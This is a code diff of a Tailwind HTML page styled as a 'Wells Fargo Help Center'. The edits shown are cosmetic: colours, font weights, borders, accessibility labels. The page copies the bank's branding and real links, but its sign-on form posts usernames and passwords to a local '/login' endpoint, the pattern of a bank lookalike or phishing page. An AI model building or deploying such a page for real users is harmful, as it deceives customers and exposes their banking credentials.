@@ -12,10 +12,10 @@
       theme: {
         extend: {
           colors: {
-            'wf-red': '#C8102E',
+            'wf-red': '#D41C2C', // Updated red color
             'wf-white': '#FFFFFF',
-            'wf-red-hover': '#A60D24',
-            'wf-yellow': '#FFC107' // For yellow shadow line
+            'wf-red-hover': '#B01724', // Adjusted hover to be slightly darker than new red
+            'wf-yellow': '#FCCC44' // Updated yellow color
           }
         }
       }
@@ -31,15 +31,15 @@
       <h1 class="text-xl font-bold text-wf-white">Wells Fargo Help Center</h1>
       <!-- Desktop Menu -->
       <div class="hidden md:flex items-center gap-2 sm:gap-4">
-        <a href="https://www.wellsfargo.com/locator/" target="_blank" rel="noopener noreferrer" class="text-wf-white text-sm font-semibold hover:underline">ATMs/Locations</a>
-        <a href="https://www.wellsfargo.com/help/" target="_blank" rel="noopener noreferrer" class="text-wf-white text-sm font-semibold hover:underline">Help</a>
-        <a href="https://www.wellsfargo.com/es/" target="_blank" rel="noopener noreferrer" class="text-wf-white text-sm font-semibold hover:underline">Español</a>
+        <a href="https://www.wellsfargo.com/locator/" target="_blank" rel="noopener noreferrer" class="text-wf-white text-sm font-medium hover:underline">ATMs/Locations</a>
+        <a href="https://www.wellsfargo.com/help/" target="_blank" rel="noopener noreferrer" class="text-wf-white text-sm font-medium hover:underline">Help</a>
+        <a href="https://www.wellsfargo.com/es/" target="_blank" rel="noopener noreferrer" class="text-wf-white text-sm font-medium hover:underline">Español</a>
         <span class="text-wf-white text-lg cursor-pointer" title="Search" aria-label="Search">
           <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
             <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m15-5a7 7 0 11-14 0 7 7 0 0114 0z" />
           </svg>
         </span>
-        <a href="https://www.wellsfargo.com/online-banking/" target="_blank" rel="noopener noreferrer" class="bg-wf-white text-wf-red font-semibold text-sm py-2 px-4 rounded-lg hover:bg-gray-100 transition">Sign On</a>
+        <a href="https://www.wellsfargo.com/online-banking/" target="_blank" rel="noopener noreferrer" class="bg-wf-white text-wf-red font-medium text-sm py-2 px-4 rounded-lg hover:bg-gray-100 transition">Sign On</a>
       </div>
       <!-- Mobile Menu Button -->
       <button id="mobile-menu-button" class="md:hidden text-wf-white focus:outline-none" aria-label="Toggle mobile menu">
@@ -51,10 +51,10 @@
     <!-- Mobile Menu -->
     <div id="mobile-menu" class="hidden md:hidden bg-wf-red px-4 sm:px-6 lg:px-8 py-4">
       <div class="flex flex-col gap-2">
-        <a href="https://www.wellsfargo.com/locator/" target="_blank" rel="noopener noreferrer" class="text-wf-white text-sm font-semibold hover:underline">ATMs/Locations</a>
-        <a href="https://www.wellsfargo.com/help/" target="_blank" rel="noopener noreferrer" class="text-wf-white text-sm font-semibold hover:underline">Help</a>
-        <a href="https://www.wellsfargo.com/es/" target="_blank" rel="noopener noreferrer" class="text-wf-white text-sm font-semibold hover:underline">Español</a>
-        <a href="https://www.wellsfargo.com/online-banking/" target="_blank" rel="noopener noreferrer" class="bg-wf-white text-wf-red font-semibold text-sm py-2 px-4 rounded-lg hover:bg-gray-100 transition w-fit">Sign On</a>
+        <a href="https://www.wellsfargo.com/locator/" target="_blank" rel="noopener noreferrer" class="text-wf-white text-sm font-medium hover:underline">ATMs/Locations</a>
+        <a href="https://www.wellsfargo.com/help/" target="_blank" rel="noopener noreferrer" class="text-wf-white text-sm font-medium hover:underline">Help</a>
+        <a href="https://www.wellsfargo.com/es/" target="_blank" rel="noopener noreferrer" class="text-wf-white text-sm font-medium hover:underline">Español</a>
+        <a href="https://www.wellsfargo.com/online-banking/" target="_blank" rel="noopener noreferrer" class="bg-wf-white text-wf-red font-medium text-sm py-2 px-4 rounded-lg hover:bg-gray-100 transition w-fit">Sign On</a>
       </div>
     </div>
   </header>
@@ -63,17 +63,17 @@
   <div class="border-t-2 border-wf-yellow"></div>
 
   <!-- Primary Navigation Menu with Shadow Background -->
-  <nav class="bg-gray-200 shadow-md py-4 border-l-[2cm] border-r-[2cm] border-white">
+  <nav class="bg-gray-200 shadow-md py-4 border-l-4 border-r-4 border-white">
     <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
       <div class="md:hidden flex justify-between items-center">
-        <span class="text-sm font-semibold text-gray-700">Menu</span>
+        <span class="text-sm font-medium text-gray-700">Menu</span>
         <button id="primary-nav-toggle" class="text-gray-700 focus:outline-none" aria-label="Toggle primary navigation">
           <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
             <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7" />
           </svg>
         </button>
       </div>
-      <ul id="primary-nav" class="flex flex-wrap gap-2 sm:gap-3 text-sm font-semibold text-gray-700 hidden md:flex">
+      <ul id="primary-nav" class="flex flex-wrap gap-2 sm:gap-3 text-sm font-medium text-gray-700 hidden md:flex">
         <li><a href="#" class="border-b-2 border-wf-red pb-1 whitespace-nowrap">Personal</a></li>
         <li><a href="#" class="hover:text-wf-red hover:border-b-2 hover:border-wf-red pb-1 transition whitespace-nowrap">Investing & Wealth Management</a></li>
         <li><a href="#" class="hover:text-wf-red hover:border-b-2 hover:border-wf-red pb-1 transition whitespace-nowrap">Small Business</a></li>
@@ -85,17 +85,17 @@
   </nav>
 
   <!-- Secondary Navigation Menu with White Background -->
-  <nav class="bg-wf-white py-4 border-l-[2cm] border-r-[2cm] border-white">
+  <nav class="bg-wf-white py-4 border-l-4 border-r-4 border-white">
     <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
       <div class="md:hidden flex justify-between items-center">
-        <span class="text-sm font-semibold text-gray-700">More Options</span>
+        <span class="text-sm font-medium text-gray-700">More Options</span>
         <button id="secondary-nav-toggle" class="text-gray-700 focus:outline-none" aria-label="Toggle secondary navigation">
           <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
             <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7" />
           </svg>
         </button>
       </div>
-      <ul id="secondary-nav" class="flex flex-wrap gap-2 sm:gap-3 text-sm font-semibold text-gray-700 hidden md:flex">
+      <ul id="secondary-nav" class="flex flex-wrap gap-2 sm:gap-3 text-sm font-medium text-gray-700 hidden md:flex">
         <li><a href="#" class="hover:text-wf-red hover:border-b-2 hover:border-wf-red pb-1 transition whitespace-nowrap">Checking</a></li>
         <li><a href="#" class="hover:text-wf-red hover:border-b-2 hover:border-wf-red pb-1 transition whitespace-nowrap">Savings & CDs</a></li>
         <li><a href="#" class="hover:text-wf-red hover:border-b-2 hover:border-wf-red pb-1 transition whitespace-nowrap">Credit Cards</a></li>
@@ -109,24 +109,24 @@
   </nav>
 
   <!-- Banner Section with Login Form -->
-  <section class="bg-wf-red py-8 border-l-[2cm] border-r-[2cm] border-white">
+  <section class="bg-wf-red py-8 border-l-4 border-r-4 border-white">
     <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
       <div class="flex flex-col md:flex-row gap-6 items-start">
         <!-- Login Form on Left -->
-        <div class="w-full md:w-1/3 bg-wf-white border-2 border-wf-red rounded-lg shadow-sm p-6">
+        <div class="w-full md:w-5/12 bg-wf-white border-2 border-wf-red rounded-lg shadow-sm p-6">
           <p class="text-lg text-gray-700 mb-4 text-left"><strong>Good evening</strong><br>Sign on to manage your accounts.</p>
           <form action="/login" method="POST" class="space-y-4">
             <div>
-              <input type="text" id="username" name="username" required class="w-full px-3 py-2 border-b-2 border-gray-300 focus:outline-none focus:border-gray-500" placeholder="Enter your username or email">
+              <input type="text" id="username" name="username" required class="w-full px-3 py-2 border-b-2 border-gray-300 focus:outline-none focus:border-gray-500" placeholder="Enter your username or email" aria-label="Username or Email">
             </div>
             <div>
-              <input type="password" id="password" name="password" required class="w-full px-3 py-2 border-b-2 border-gray-300 focus:outline-none focus:border-gray-500" placeholder="Enter your password">
+              <input type="password" id="password" name="password" required class="w-full px-3 py-2 border-b-2 border-gray-300 focus:outline-none focus:border-gray-500" placeholder="Enter your password" aria-label="Password">
             </div>
             <div class="text-left">
               <a href="https://www.wellsfargo.com/help/forgot-password" target="_blank" rel="noopener noreferrer" class="text-wf-red hover:underline text-sm">Forgot Password?</a>
             </div>
             <div class="flex items-center gap-4">
-              <button type="submit" class="bg-wf-red text-wf-white font-semibold py-3 px-6 rounded-lg hover:bg-wf-red-hover transition">Sign On</button>
+              <button type="submit" class="bg-wf-red text-wf-white font-medium py-3 px-6 rounded-lg hover:bg-wf-red-hover transition">Sign On</button>
               <h3 class="text-lg font-bold text-gray-900">Enroll</h3>
             </div>
           </form>
@@ -137,7 +137,7 @@
           <p class="text-lg text-wf-white mb-4">
             Sign up or log in to access <strong>Wells Fargo Online®</strong> and take control of your finances. Monitor your accounts, track spending, and get personalized insights with My Spending Report.
           </p>
-          <a href="https://www.wellsfargo.com/online-banking/" target="_blank" rel="noopener noreferrer" class="inline-block bg-wf-white text-wf-red font-semibold py-3 px-6 rounded-lg hover:bg-gray-100 transition">Learn More</a>
+          <a href="https://www.wellsfargo.com/online-banking/" target="_blank" rel="noopener noreferrer" class="inline-block bg-wf-white text-wf-red font-medium py-3 px-6 rounded-lg hover:bg-gray-100 transition">Learn More</a>
         </div>
       </div>
     </div>
@@ -152,7 +152,7 @@
       <p class="text-xl text-gray-700 mt-2">Call us Now <a href="tel:1-800-869-3557" class="text-wf-red hover:underline">Contact Us</a></p>
       <p class="text-sm text-gray-500 mt-1">Available 24/7 to assist you.</p>
     </div>
-    <a href="tel:1-800-869-3557" target="_blank" rel="noopener noreferrer" class="inline-block bg-wf-red text-wf-white font-semibold py-3 px-6 rounded-lg hover:bg-wf-red-hover transition">Call Now</a>
+    <a href="tel:1-800-869-3557" target="_blank" rel="noopener noreferrer" class="inline-block bg-wf-red text-wf-white font-medium py-3 px-6 rounded-lg hover:bg-wf-red-hover transition">Call Now</a>
     
     <!-- Divider -->
     <hr class="my-8 border-t-2 border-wf-red max-w-md mx-auto">
@@ -169,7 +169,7 @@
           <li class="mb-2">Mobile app support</li>
         </ul>
       </div>
-      <a href="tel:1-800-869-3557" class="inline-block bg-wf-red text-wf-white font-semibold py-3 px-6 rounded-lg hover:bg-wf-red-hover transition mt-6">Call Now</a>
+      <a href="tel:1-800-869-3557" target="_blank" rel="noopener noreferrer" class="inline-block bg-wf-red text-wf-white font-medium py-3 px-6 rounded-lg hover:bg-wf-red-hover transition mt-6">Call Now</a>
     </section>
 
     <!-- Divider -->
@@ -186,7 +186,7 @@
           </p>
         </div>
         <!-- Image on Right -->
-        <div class="flex-shrink-0 w-full md:w-1/3">
+        <div class="flex-shrink-0 w-full max-w-xs mx-auto md:w-1/3 md:mx-0">
           <img src="wf01.png" alt="Wells Fargo My Spending Report chart showing categorized expenses" class="w-full h-auto rounded-lg shadow-sm object-contain">
         </div>
       </div>
